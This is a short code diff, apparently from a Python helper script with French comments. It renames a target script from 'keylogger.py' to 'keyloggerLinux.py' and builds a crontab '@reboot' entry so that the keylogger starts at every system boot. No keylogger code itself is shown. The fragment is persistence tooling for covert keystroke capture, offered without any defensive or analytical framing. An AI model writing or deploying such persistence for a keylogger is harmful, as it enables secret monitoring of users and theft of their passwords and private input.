@@ -2,7 +2,7 @@ import os
 import subprocess
 
 # Chemin vers le script Python
-python_script = "keylogger.py"
+python_script = "keyloggerLinux.py"
 
 # Commande crontab pour exécuter le script Python au démarrage
 cron_job = f"@reboot python3 {python_script}"
